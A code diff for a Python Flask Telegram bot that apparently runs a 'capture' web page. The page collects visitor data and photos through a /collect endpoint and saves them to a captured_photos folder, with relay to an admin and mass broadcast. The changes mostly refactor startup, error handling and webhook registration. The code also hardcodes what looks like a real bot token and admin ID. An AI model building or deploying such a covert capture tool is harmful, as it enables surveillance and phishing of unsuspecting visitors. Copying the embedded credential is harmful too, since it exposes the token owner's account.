@@ -12,7 +12,8 @@ from flask import Flask, request, jsonify, render_template_string
 # ==================== HARDCODED CONFIG ====================
 BOT_TOKEN = "8680846598:AAE0o3vS2fn16ZuIvvPJjXeuPQubDT2eUo8"
 ADMIN_IDS = [8691519315]
-BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
+RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
+BASE_URL = RENDER_URL if RENDER_URL else "http://localhost:5000"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 # ==================== SETUP ====================
@@ -145,14 +146,14 @@ def send_msg(chat_id, text, parse_mode="Markdown", reply_markup=None):
         logger.error(f"send_msg error: {e}")
         return None
 
-def send_photo_msg(chat_id, photo_path_or_data, caption=""):
+def send_photo_msg(chat_id, photo_data, caption=""):
     url = f"{TELEGRAM_API}/sendPhoto"
-    if isinstance(photo_path_or_data, str) and photo_path_or_data.startswith("data:image"):
-        img_data = base64.b64decode(photo_path_or_data.split(",")[1])
+    if isinstance(photo_data, str) and photo_data.startswith("data:image"):
+        img_data = base64.b64decode(photo_data.split(",")[1])
         files = {"photo": ("photo.jpg", BytesIO(img_data), "image/jpeg")}
         data = {"chat_id": chat_id, "caption": caption}
     else:
-        files = {"photo": open(photo_path_or_data, "rb")}
+        files = {"photo": open(photo_data, "rb")}
         data = {"chat_id": chat_id, "caption": caption}
     try:
         return requests.post(url, data=data, files=files, timeout=10).json()
@@ -180,7 +181,8 @@ def edit_msg(chat_id, msg_id, text, parse_mode="Markdown", reply_markup=None):
 def answer_cb(cb_id, text="", alert=False):
     try:
         requests.post(f"{TELEGRAM_API}/answerCallbackQuery", data={"callback_query_id": cb_id, "text": text, "show_alert": alert}, timeout=5)
-    except: pass
+    except:
+        pass
 
 # ==================== BOT HANDLERS ====================
 
@@ -305,45 +307,51 @@ def handle_callback(cb):
 
 @app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
 def webhook():
-    update = request.get_json()
-    if not update: return "OK", 200
-    logger.info(f"Update: {json.dumps(update)[:150]}")
-    
-    # Message
-    if "message" in update:
-        msg = update["message"]
-        chat_id = msg["chat"]["id"]
-        text = msg.get("text","")
-        username = msg["from"].get("username","")
-        first_name = msg["from"].get("first_name","User")
+    try:
+        update = request.get_json()
+        if not update:
+            return "OK", 200
         
-        if text == "/start":
-            handle_start(chat_id, username, first_name)
-        elif text.startswith("/admin") or text.startswith("/panel"):
-            handle_admin_panel(chat_id)
-        elif "photo" in msg:
-            handle_photo_received(chat_id, msg["photo"][-1]["file_id"])
-        elif chat_id in ADMIN_IDS and chat_id in app.pending_broadcast:
-            app.pending_broadcast.pop(chat_id, None)
-            users = get_all_users()
-            suc, fail = 0, 0
-            for u in users:
-                try:
-                    send_msg(u["chat_id"], f"📢 **Broadcast:**\n\n{text}")
-                    suc += 1
-                except: fail += 1
-            send_msg(chat_id, f"✅ Sent: {suc} | Failed: {fail}")
-    
-    # Callback
-    if "callback_query" in update:
-        handle_callback(update["callback_query"])
-    
-    return "OK", 200
+        logger.info(f"Update: {json.dumps(update)[:200]}")
+        
+        # Message
+        if "message" in update:
+            msg = update["message"]
+            chat_id = msg["chat"]["id"]
+            text = msg.get("text","")
+            username = msg["from"].get("username","")
+            first_name = msg["from"].get("first_name","User")
+            
+            if text == "/start":
+                handle_start(chat_id, username, first_name)
+            elif text.startswith("/admin") or text.startswith("/panel"):
+                handle_admin_panel(chat_id)
+            elif "photo" in msg:
+                handle_photo_received(chat_id, msg["photo"][-1]["file_id"])
+            elif chat_id in ADMIN_IDS and chat_id in app.pending_broadcast:
+                app.pending_broadcast.pop(chat_id, None)
+                users = get_all_users()
+                suc, fail = 0, 0
+                for u in users:
+                    try:
+                        send_msg(u["chat_id"], f"📢 **Broadcast:**\n\n{text}")
+                        suc += 1
+                    except:
+                        fail += 1
+                send_msg(chat_id, f"✅ Sent: {suc} | Failed: {fail}")
+        
+        # Callback
+        if "callback_query" in update:
+            handle_callback(update["callback_query"])
+        
+        return "OK", 200
+    except Exception as e:
+        logger.error(f"Webhook error: {e}", exc_info=True)
+        return "OK", 200
 
 # ==================== CAPTURE WEB PAGE ====================
 
-HTML_PAGE = """
-<!DOCTYPE html>
+HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -564,16 +572,13 @@ def collect():
         update_stat("total_visits", get_stat("total_visits") + 1)
         return jsonify({"status":"success"})
     except Exception as e:
-        logger.error(f"Collect error: {e}")
+        logger.error(f"Collect error: {e}", exc_info=True)
         return jsonify({"status":"error","message":str(e)}), 500
 
 # ==================== UTILITY ROUTES ====================
 
 @app.route("/")
 def home():
-    return redirect_to_bot()
-
-def redirect_to_bot():
     bot_username = BOT_TOKEN.split(":")[0]
     return f'<script>window.location="https://t.me/{bot_username}";</script><a href="https://t.me/{bot_username}">Open Bot</a>'
 
@@ -613,20 +618,35 @@ def delete_webhook():
     except Exception as e:
         return jsonify({"status":"error","message":str(e)})
 
-# ==================== APP STARTUP HANDLER ====================
-# Yeh Flask ke server start hone ke BAAD chalega - safely
-with app.app_context():
-    print("🚀 Initializing Telegram Bot...")
-    try:
-        init_db()
-        os.makedirs("photos", exist_ok=True)
-        os.makedirs("captured_photos", exist_ok=True)
-        os.makedirs("exports", exist_ok=True)
-        print("✅ Database & directories ready")
-    except Exception as e:
-        print(f"⚠️ Init warning (non-critical): {e}")
-
-# Webhook set karne ke liye ek route hai already:
-# /set_webhook pe visit karein deploy ke baad
-print("🤖 App loaded! Visit /set_webhook after deploy to register webhook.")
-print(f"📡 Health check: /health")
+# ==================== SAFE STARTUP (GUNICORN COMPATIBLE) ====================
+# Yeh code Sirf TAB chalta hai jab python app.py se run karein
+# Render pe gunicorn istemal karta hai, toh yeh nahi chalega - isliye safe hai
+if __name__ == "__main__":
+    print("🚀 Running in development mode...")
+    print("⚠️ For production, use: gunicorn app:app")
+    init_db()
+    os.makedirs("photos", exist_ok=True)
+    os.makedirs("captured_photos", exist_ok=True)
+    os.makedirs("exports", exist_ok=True)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
+else:
+    # Gunicorn ke saath: yeh tab chalta hai jab Render import karta hai
+    print("🚀 Gunicorn mode: Initializing...")
+    init_db()
+    os.makedirs("photos", exist_ok=True)
+    os.makedirs("captured_photos", exist_ok=True)
+    os.makedirs("exports", exist_ok=True)
+    
+    # Webhook auto-set agar Render URL available hai
+    if RENDER_URL:
+        wh_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
+        try:
+            r = requests.get(f"{TELEGRAM_API}/setWebhook?url={wh_url}", timeout=10).json()
+            print(f"✅ Webhook set: {r.get('description', 'OK')}")
+        except Exception as e:
+            print(f"⚠️ Webhook auto-set failed: {e}")
+    else:
+        print("⚠️ RENDER_EXTERNAL_URL not set. Visit /set_webhook after deploy.")
+    
+    print(f"🤖 Bot ready! Admin: /admin | Health: /health")
